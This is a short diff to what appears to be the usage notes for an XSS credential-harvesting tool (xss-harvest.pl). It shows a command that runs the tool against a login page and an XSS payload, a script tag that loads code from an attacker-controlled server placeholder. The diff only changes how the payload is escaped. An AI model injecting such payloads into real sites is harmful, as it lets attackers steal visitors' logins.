@@ -32,4 +32,5 @@ Start server (with redress:)
 * ./xss-harvest.pl -l -r http://vulnerablepage.local/login.html
 
 XSS:
-* \<script src="http://<serverip>:<serverport>/i"></script>
+
+* \<script src="http:\/\/<serverip>:<serverport>\/i\"\>\</script\>
